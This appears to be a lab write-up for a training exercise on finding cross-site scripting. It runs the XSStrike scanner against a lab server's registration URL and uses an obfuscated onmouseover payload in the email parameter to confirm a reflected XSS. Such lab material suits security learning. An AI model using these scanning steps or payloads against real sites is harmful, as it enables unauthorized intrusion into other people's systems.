# XSS Discovery

### Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?



<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To look for insertion points we entered random values on the application, and then clicked on Register.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then we copy the URL as it is:

```
http://94.237.58.33:51035/?fullname=asdasd&username=sdasf&password=testeasdasd&email=test%40test.com
```

Lastly we'll use the xsstrike tool to explore the parameters:

{% code overflow="wrap" %}
```bash
python xsstrike.py -u "http://94.237.58.33:51035/?fullname=asdasd&username=sdasf&password=testeasdasd&email=test%40test.com"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As the tool runs, we can see that the a reflection was found in the email!



### What type of XSS was found on the above server? "name only"



To answer this question we have to explore the vulnerability

We take the URL used in the last exercise and add the tested payload:

{% code overflow="wrap" %}
```html
http://94.237.58.33:51035/?fullname=asdasd&username=sdasf&password=testeasdasd&email=test%40test.com<A%0AONmOuSeOver+=+(prompt)``>v3dm0s
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then we just paste the modified URL and the prompt appears.

This is a Reflected XSS, we can confirm that by revisiting the page.
